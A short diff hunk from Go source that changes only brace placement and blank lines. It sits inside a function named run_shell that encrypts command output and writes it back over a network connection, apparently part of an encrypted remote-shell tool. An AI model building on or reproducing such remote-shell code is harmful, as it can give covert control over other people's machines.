@@ -51,9 +51,10 @@ func run_shell(conn net.Conn) {
             enc_cmdout := encryption(true, key, string(cmdout))
             output := string(enc_cmdout) + "\n"
             conn.Write([]byte(output))
-        }
 
+        }
     }
+
 }
 
 func encryption(encrypt bool, key []byte, message string) (result string) {
